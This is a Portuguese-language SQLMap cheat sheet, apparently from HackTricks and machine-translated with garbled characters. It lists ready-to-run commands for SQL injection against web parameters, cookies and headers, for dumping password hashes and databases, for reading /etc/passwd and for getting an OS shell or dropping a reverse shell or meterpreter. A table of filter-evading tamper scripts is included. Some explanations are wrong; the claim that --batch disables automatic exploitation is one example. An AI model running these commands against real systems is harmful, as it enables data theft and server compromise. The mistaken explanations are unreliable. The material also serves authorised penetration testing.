# SQLMap - CheatSheet

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Voc√™ quer ver sua **empresa anunciada no HackTricks**? ou voc√™ quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**reposit√≥rio hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference √© um evento internacional de ciberseguran√ßa**](https://www.dragonjarcon.org/) com mais de uma d√©cada que ser√° realizado nos dias 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento de grande conte√∫do t√©cnico onde as √∫ltimas pesquisas em espanhol s√£o apresentadas, atraindo hackers e pesquisadores de todo o mundo.\
Registre-se agora no link abaixo e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org/" %}

## Argumentos b√°sicos para o SQLmap

### Gen√©ricos
```bash
-u "<URL>" 
-p "<PARAM TO TEST>" 
--user-agent=SQLMAP 
--random-agent 
--threads=10 
--risk=3 #MAX
--level=5 #MAX
--dbms="<KNOWN DB TECH>" 
--os="<OS>"
--technique="UB" #Use only techniques UNION and BLIND in that order (default "BEUSTQ")
--batch #Non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--auth-type="<AUTH>" #HTTP authentication type (Basic, Digest, NTLM or PKI)
--auth-cred="<AUTH>" #HTTP authentication credentials (name:password)
--proxy=http://127.0.0.1:8080
--union-char "GsFRts2" #Help sqlmap identify union SQLi techniques with a weird union char
```
### Recuperar Informa√ß√£o

#### Interno
```bash
--current-user #Get current user
--is-dba #Check if current user is Admin
--hostname #Get hostname
--users #Get usernames od DB
--passwords #Get passwords of users in DB
--privileges #Get privileges
```
#### Dados do banco de dados
```bash
--all #Retrieve everything
--dump #Dump DBMS database table entries
--dbs #Names of the available databases
--tables #Tables of a database ( -D <DB NAME> )
--columns #Columns of a table  ( -D <DB NAME> -T <TABLE NAME> )
-D <DB NAME> -T <TABLE NAME> -C <COLUMN NAME> #Dump column
```
## Local de Inje√ß√£o

### A partir da captura do Burp/ZAP

Capture a requisi√ß√£o e crie um arquivo req.txt.
```bash
sqlmap -r req.txt --current-user
```
### Inje√ß√£o de Requisi√ß√£o GET
```bash
sqlmap -u "http://example.com/?id=1" -p id
sqlmap -u "http://example.com/?id=*" -p id
```
### Inje√ß√£o de Requisi√ß√£o POST
```bash
sqlmap -u "http://example.com" --data "username=*&password=*"
```
### Inje√ß√µes em Headers e outros M√©todos HTTP

#### Header Injection

#### Inje√ß√£o em Headers

Header injection vulnerabilities occur when user input is not properly sanitized and is included in an HTTP header. This can allow an attacker to inject additional headers or modify existing ones, potentially leading to a range of attacks such as cross-site scripting (XSS), session hijacking, and cache poisoning.

Vulnerabilidades de inje√ß√£o em headers ocorrem quando a entrada do usu√°rio n√£o √© devidamente sanitizada e √© inclu√≠da em um header HTTP. Isso pode permitir que um atacante injete headers adicionais ou modifique os existentes, potencialmente levando a uma s√©rie de ataques, como cross-site scripting (XSS), sequestro de sess√£o e envenenamento de cache.

#### HTTP Method Tampering

#### Manipula√ß√£o de M√©todo HTTP

HTTP Method Tampering vulnerabilities occur when an attacker is able to modify the HTTP method used in a request. For example, an attacker may be able to change a POST request to a GET request, potentially bypassing security controls that are designed to prevent unauthorized access to sensitive data or functionality.

Vulnerabilidades de manipula√ß√£o de m√©todo HTTP ocorrem quando um atacante √© capaz de modificar o m√©todo HTTP usado em uma solicita√ß√£o. Por exemplo, um atacante pode ser capaz de mudar uma solicita√ß√£o POST para uma solicita√ß√£o GET, potencialmente contornando controles de seguran√ßa que s√£o projetados para impedir o acesso n√£o autorizado a dados ou funcionalidades sens√≠veis.
```bash
#Inside cookie
sqlmap  -u "http://example.com" --cookie "mycookies=*"

#Inside some header
sqlmap -u "http://example.com" --headers="x-forwarded-for:127.0.0.1*"
sqlmap -u "http://example.com" --headers="referer:*"

#PUT Method
sqlmap --method=PUT -u "http://example.com" --headers="referer:*"

#The injection is located at the '*'
```
### Indicar a string quando a inje√ß√£o for bem-sucedida
```bash
--string="string_showed_when_TRUE" 
```
### Eval

O **Sqlmap** permite o uso de `-e` ou `--eval` para processar cada payload antes de envi√°-lo com algum c√≥digo python em uma linha. Isso torna muito f√°cil e r√°pido processar de maneiras personalizadas o payload antes de envi√°-lo. No exemplo a seguir, a **sess√£o de cookie do flask** **√© assinada pelo flask com o segredo conhecido antes de envi√°-la**:
```bash
sqlmap http://1.1.1.1/sqli --eval "from flask_unsign import session as s; session = s.sign({'uid': session}, secret='SecretExfilratedFromTheMachine')" --cookie="session=*" --dump
```
### Shell

A op√ß√£o `--os-shell` permite que voc√™ obtenha um shell interativo no sistema operacional subjacente. Isso √© √∫til quando voc√™ deseja executar comandos que n√£o s√£o suportados pelo SQLi, como ler arquivos ou executar programas.

```bash
sqlmap -r request.txt --os-shell
```

Isso abrir√° um shell interativo no sistema operacional subjacente. A partir daqui, voc√™ pode executar comandos como faria normalmente em um terminal.

```bash
os-shell> whoami
root
os-shell> cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
...
```

Lembre-se de que voc√™ est√° agora em um shell interativo no sistema operacional subjacente. Tenha cuidado com o que voc√™ executa e certifique-se de que voc√™ sabe o que est√° fazendo.
```bash
#Exec command
python sqlmap.py -u "http://example.com/?id=1" -p id --os-cmd whoami

#Simple Shell
python sqlmap.py -u "http://example.com/?id=1" -p id --os-shell

#Dropping a reverse-shell / meterpreter
python sqlmap.py -u "http://example.com/?id=1" -p id --os-pwn
```
### Ler Arquivo

A op√ß√£o `--file-read` do Sqlmap permite ler arquivos do sistema de arquivos do servidor de banco de dados. Para us√°-la, basta especificar o caminho do arquivo que se deseja ler.

Exemplo:

```
sqlmap -u "http://example.com/page.php?id=1" --file-read="/etc/passwd"
```

Este comando ir√° ler o arquivo `/etc/passwd` do servidor de banco de dados e exibir seu conte√∫do na sa√≠da do Sqlmap. √â importante lembrar que o usu√°rio que est√° executando o comando deve ter permiss√£o de leitura no arquivo desejado.
```bash
--file-read=/etc/passwd
```
### Rastreando um site com SQLmap e auto-exploit

O SQLmap √© uma ferramenta poderosa para testes de penetra√ß√£o em sites que possuem vulnerabilidades de inje√ß√£o de SQL. Uma das funcionalidades mais √∫teis do SQLmap √© a capacidade de rastrear automaticamente um site em busca de vulnerabilidades de inje√ß√£o de SQL e, em seguida, explor√°-las automaticamente.

Para rastrear um site com o SQLmap, basta executar o seguinte comando:

```
sqlmap -u <URL> --crawl=1
```

Isso far√° com que o SQLmap rastreie o site especificado na URL em busca de vulnerabilidades de inje√ß√£o de SQL. O par√¢metro `--crawl=1` indica que o SQLmap deve seguir todos os links encontrados no site.

Se o SQLmap encontrar uma vulnerabilidade de inje√ß√£o de SQL, ele tentar√° explor√°-la automaticamente. Para desativar essa funcionalidade, use o par√¢metro `--batch`.

```
sqlmap -u <URL> --crawl=1 --batch
```

Este comando far√° com que o SQLmap rastreie o site especificado na URL em busca de vulnerabilidades de inje√ß√£o de SQL, mas n√£o tentar√° explor√°-las automaticamente.
```bash
sqlmap -u "http://example.com/" --crawl=1 --random-agent --batch --forms --threads=5 --level=5 --risk=3

--batch = non interactive mode, usually Sqlmap will ask you questions, this accepts the default answers
--crawl = how deep you want to crawl a site
--forms = Parse and test forms
```
### Inje√ß√£o de Segunda Ordem
```bash
python sqlmap.py -r /tmp/r.txt --dbms MySQL --second-order "http://targetapp/wishlist" -v 3
sqlmap -r 1.txt -dbms MySQL -second-order "http://<IP/domain>/joomla/administrator/index.php" -D "joomla" -dbs
```
[**Leia este post**](second-order-injection-sqlmap.md)** sobre como realizar inje√ß√µes de segunda ordem simples e complexas com o sqlmap.**

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference √© um evento internacional de seguran√ßa cibern√©tica**](https://www.dragonjarcon.org/) com mais de uma d√©cada de exist√™ncia que ser√° realizado nos dias 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento com grande conte√∫do t√©cnico onde s√£o apresentadas as √∫ltimas pesquisas em espanhol que atrai hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org/" %}

## Personalizando a Inje√ß√£o

### Definir um sufixo
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --suffix="-- "
```
### Prefixo
```bash
python sqlmap.py -u "http://example.com/?id=1"  -p id --prefix="') "
```
### Ajuda para encontrar inje√ß√£o booleana
```bash
# The --not-string "string" will help finding a string that does not appear in True responses (for finding boolean blind injection)
sqlmap -r r.txt -p id --not-string ridiculous --batch
```
### Tamper

Lembre-se de que **voc√™ pode criar seu pr√≥prio tamper em python** e √© muito simples. Voc√™ pode encontrar um exemplo de tamper na p√°gina [Inje√ß√£o de Segunda Ordem aqui](second-order-injection-sqlmap.md).
```bash
--tamper=name_of_the_tamper
#In kali you can see all the tampers in /usr/share/sqlmap/tamper
```
| Tamper                       | Descri√ß√£o                                                                                                                          |
| ---------------------------- | ---------------------------------------------------------------------------------------------------------------------------------- |
| apostrophemask.py            | Substitui o caractere ap√≥strofo pelo seu equivalente UTF-8 de largura total                                                            |
| apostrophenullencode.py      | Substitui o caractere ap√≥strofo pelo seu equivalente duplo unicode ilegal                                                             |
| appendnullbyte.py            | Adiciona um byte nulo codificado ao final da carga √∫til                                                                              |
| base64encode.py              | Codifica em base64 todos os caracteres em uma determinada carga √∫til                                                                 |
| between.py                   | Substitui o operador maior que ('>') por 'NOT BETWEEN 0 AND #'                                                                       |
| bluecoat.py                  | Substitui o caractere de espa√ßo ap√≥s a instru√ß√£o SQL por um caractere em branco v√°lido aleat√≥rio. Em seguida, substitui o caractere '=' pelo operador LIKE |
| chardoubleencode.py          | Codifica em dobro todos os caracteres em uma determinada carga √∫til (n√£o processando os j√° codificados)                             |
| commalesslimit.py            | Substitui inst√¢ncias como 'LIMIT M, N' por 'LIMIT N OFFSET M'                                                                        |
| commalessmid.py              | Substitui inst√¢ncias como 'MID(A, B, C)' por 'MID(A FROM B FOR C)'                                                                   |
| concat2concatws.py           | Substitui inst√¢ncias como 'CONCAT(A, B)' por 'CONCAT\_WS(MID(CHAR(0), 0, 0), A, B)'                                                  |
| charencode.py                | Codifica em URL todos os caracteres em uma determinada carga √∫til (n√£o processando os j√° codificados)                                |
| charunicodeencode.py         | Codifica em URL Unicode os caracteres n√£o codificados em uma determinada carga √∫til (n√£o processando os j√° codificados). "%u0022" |
| charunicodeescape.py         | Codifica em URL Unicode os caracteres n√£o codificados em uma determinada carga √∫til (n√£o processando os j√° codificados). "\u0022" |
| equaltolike.py               | Substitui todas as ocorr√™ncias do operador igual ('=') pelo operador 'LIKE'                                                         |
| escapequotes.py              | Escapa aspas simples (' e ")                                                                                                        |
| greatest.py                  | Substitui o operador maior que ('>') pelo seu equivalente GREATEST                                                                   |
| halfversionedmorekeywords.py | Adiciona coment√°rio versionado do MySQL antes de cada palavra-chave                                                                 |
| ifnull2ifisnull.py           | Substitui inst√¢ncias como 'IFNULL(A, B)' por 'IF(ISNULL(A), B, A)'                                                                   |
| modsecurityversioned.py      | Envolve a consulta completa com coment√°rio versionado do MySQL                                                                       |
| modsecurityzeroversioned.py  | Envolve a consulta completa com coment√°rio de vers√£o zero do MySQL                                                                   |
| multiplespaces.py            | Adiciona v√°rios espa√ßos em torno das palavras-chave SQL                                                                              |
| nonrecursivereplacement.py   | Substitui palavras-chave SQL predefinidas por representa√ß√µes adequadas para substitui√ß√£o (por exemplo, .replace("SELECT", "")) filtros |
| percentage.py                | Adiciona um sinal de porcentagem ('%') na frente de cada caractere                                                                   |
| overlongutf8.py              | Converte todos os caracteres em uma determinada carga √∫til (n√£o processando os j√° codificados)                                      |
| randomcase.py                | Substitui cada caractere de palavra-chave por um valor de caso aleat√≥rio                                                              |
| randomcomments.py            | Adiciona coment√°rios aleat√≥rios √†s palavras-chave SQL                                                                               |
| securesphere.py              | Adiciona uma string especial criada                                                                                                 |
| sp\_password.py              | Adiciona 'sp\_password' ao final da carga √∫til para obfusca√ß√£o autom√°tica dos logs do DBMS                                           |
| space2comment.py             | Substitui o caractere de espa√ßo (' ') por coment√°rios                                                                               |
| space2dash.py                | Substitui o caractere de espa√ßo (' ') por um coment√°rio de tra√ßo ('--') seguido de uma string aleat√≥ria e uma nova linha ('\n')     |
| space2hash.py                | Substitui o caractere de espa√ßo (' ') por um caractere de libra ('#') seguido de uma string aleat√≥ria e uma nova linha ('\n')       |
| space2morehash.py            | Substitui o caractere de espa√ßo (' ') por um caractere de libra ('#') seguido de uma string aleat√≥ria e uma nova linha ('\n')       |
| space2mssqlblank.py          | Substitui o caractere de espa√ßo (' ') por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos         |
| space2mssqlhash.py           | Substitui o caractere de espa√ßo (' ') por um caractere de libra ('#') seguido de uma nova linha ('\n')                               |
| space2mysqlblank.py          | Substitui o caractere de espa√ßo (' ') por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos         |
| space2mysqldash.py           | Substitui o caractere de espa√ßo (' ') por um coment√°rio de tra√ßo ('--') seguido de uma nova linha ('\n')                             |
| space2plus.py                | Substitui o caractere de espa√ßo (' ') por um sinal de mais ('+')                                                                    |
| space2randomblank.py         | Substitui o caractere de espa√ßo (' ') por um caractere em branco aleat√≥rio de um conjunto v√°lido de caracteres alternativos         |
| symboliclogical.py           | Substitui os operadores l√≥gicos AND e OR por seus equivalentes simb√≥licos (&& e \|\|)                                                 |
| unionalltounion.py           | Substitui UNION ALL SELECT por UNION SELECT                                                                                         |
| unmagicquotes.py             | Substitui o caractere de aspas simples (') por uma combina√ß√£o multibyte %bf%27 juntamente com um coment√°rio gen√©rico no final (para que funcione) |
| uppercase.py                 | Substitui cada caractere de palavra-chave por um valor em mai√∫sculas 'INSERT'                                                        |
| varnish.py                   | Adiciona um cabe√ßalho HTTP 'X-originating-IP'                                                                                        |
| versionedkeywords.py         | Envolve cada palavra-chave n√£o funcional com coment√°rio versionado do MySQL                                                          |
| versionedmorekeywords.py     | Envolve cada palavra-chave com coment√°rio versionado do MySQL                                                                       |
| xforwardedfor.py             | Adiciona um cabe√ßalho HTTP falso 'X-Forwarded-For'                                                                                  |

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

[**DragonJAR Security Conference** √© um evento internacional de ciberseguran√ßa com mais de uma d√©cada de exist√™ncia que ser√° realizado em 7 e 8 de setembro de 2023 em Bogot√°, Col√¥mbia. √â um evento de grande conte√∫do t√©cnico onde s√£o apresentadas as √∫ltimas pesquisas em espanhol que atrai hackers e pesquisadores de todo o mundo.\
Registre-se agora no seguinte link e n√£o perca esta grande confer√™ncia!:

{% embed url="https://www.dragonjarcon.org/" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Quer ver sua **empresa anunciada no HackTricks**? ou quer ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para o** [**reposit√≥rio hacktricks**](https://github.com/carlospolop/hacktr
